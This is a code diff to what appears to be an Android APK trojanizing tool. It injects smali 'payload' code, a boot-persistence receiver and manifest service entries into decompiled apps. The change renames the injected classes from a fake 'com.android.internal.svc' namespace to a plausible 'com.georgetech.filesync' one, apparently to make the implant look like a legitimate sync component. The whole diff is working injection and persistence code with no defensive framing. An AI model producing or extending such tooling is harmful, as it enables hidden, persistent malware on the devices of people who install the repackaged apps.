@@ -46,7 +46,7 @@ SMALI_SERVICE_START = """.method private startPayload()V
     .locals 2
 
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/android/internal/svc/SyncService;
+    const-class v1, Lcom/georgetech/filesync/SyncService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
@@ -66,7 +66,7 @@ SMALI_SERVICE_START = """.method private startPayload()V
 .end method
 """
 
-SMALI_BOOT_RECEIVER = """.class public Lcom/android/internal/svc/persistence/StartReceiver;
+SMALI_BOOT_RECEIVER = """.class public Lcom/georgetech/filesync/persistence/StartReceiver;
 .super Landroid/content/BroadcastReceiver;
 
 .method public constructor <init>()V
@@ -88,7 +88,7 @@ SMALI_BOOT_RECEIVER = """.class public Lcom/android/internal/svc/persistence/Sta
     if-eqz v0, :cond_0
 
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/android/internal/svc/SyncService;
+    const-class v1, Lcom/georgetech/filesync/SyncService;
     invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
@@ -137,7 +137,7 @@ def inject_payload_smali(decompiled_dir, payload_smali_dir):
         target_smali = os.path.join(decompiled_dir, "smali_classes2")
         os.makedirs(target_smali, exist_ok=True)
 
-    payload_dest = os.path.join(target_smali, "com", "android", "internal", "svc")
+    payload_dest = os.path.join(target_smali, "com", "georgetech", "filesync")
     if os.path.exists(payload_dest):
         shutil.rmtree(payload_dest)
 
@@ -175,12 +175,12 @@ def patch_manifest(decompiled_dir):
 
     service_block = f'''
         <service
-            android:name="com.android.internal.svc.SyncService"
+            android:name="com.georgetech.filesync.SyncService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <receiver
-            android:name="com.android.internal.svc.persistence.StartReceiver"
+            android:name="com.georgetech.filesync.persistence.StartReceiver"
             android:exported="true"
             android:enabled="true">
             <intent-filter>
@@ -189,7 +189,7 @@ def patch_manifest(decompiled_dir):
         </receiver>
 '''
 
-    if "com.android.internal.svc.SyncService" not in content:
+    if "com.georgetech.filesync.SyncService" not in content:
         content = content.replace("</application>", service_block + "    </application>")
         print(f"    [+] Injected SyncService + StartReceiver into manifest")
 
@@ -238,8 +238,8 @@ def inject_startup_hook(decompiled_dir):
                     1
                 )
                 smali_content += "\n" + SMALI_SERVICE_START.replace(
-                    "Lcom/android/internal/svc/SyncService;",
-                    "Lcom/android/internal/svc/SyncService;"
+                    "Lcom/georgetech/filesync/SyncService;",
+                    "Lcom/georgetech/filesync/SyncService;"
                 )
 
                 with open(full_path, "w") as f:
